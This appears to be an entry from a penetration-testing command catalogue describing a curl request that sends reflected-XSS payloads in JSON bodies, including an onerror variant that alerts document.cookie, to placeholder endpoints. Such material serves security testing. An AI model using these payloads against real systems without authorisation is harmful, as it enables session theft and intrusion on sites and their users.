---
id: cmd-curl-invalid-json-xss-296094
data: >-
  curl -X POST -H "Content-Type: application/json" -d '{"key":
  "<script>alert(\"XSS via JSON Error\")</script>"}'
  https://target.com/api/vulnerable-endpoint
tags:
  - xss
  - web
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:20.537Z'
verified: false
validated: true
submitted: true
---
# curl-send-invalid-json-xss

## Command

```bash
curl -X POST -H "Content-Type: application/json" -d '{"key": "<script>alert(\"XSS via JSON Error\")</script>"}' https://target.com/api/vulnerable-endpoint
```

## Description

This command uses curl to send a POST request with invalid JSON containing an embedded XSS payload to a target API endpoint. It tests for reflected XSS by provoking an error response that echoes the unsanitized input, useful for vulnerability assessment in web applications handling JSON.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-H "Content-Type: application/json"` | Sets the request header to indicate JSON data | Yes |
| `-d 'payload'` | The data payload, here invalid JSON with <script> tag | Yes |
| `https://target.com/api/vulnerable-endpoint` | The target URL endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Content-Type: application/json" -d '{"invalid": "<script>alert(1)</script>"}' https://example.com/api/test
```

### Advanced Usage

```bash
curl -X POST -H "Content-Type: application/json" -d '{"data": "<img src=x onerror=alert(document.cookie)>"}' -v https://target.com/api/secure --cookie "session=abc123"
```

Includes verbose output (-v) and simulates authenticated request.

## Expected Output

A 400 Bad Request response with HTML body reflecting the payload, e.g., "JSON Parse Error: {"key": "<script>alert(\"XSS via JSON Error\")</script>"} Invalid input detected." No alert in curl, but when response HTML is viewed in browser, the script executes.

## Related

- [[Related Procedure: Trigger-Reflected-XSS-with-Invalid-JSON-Input]]
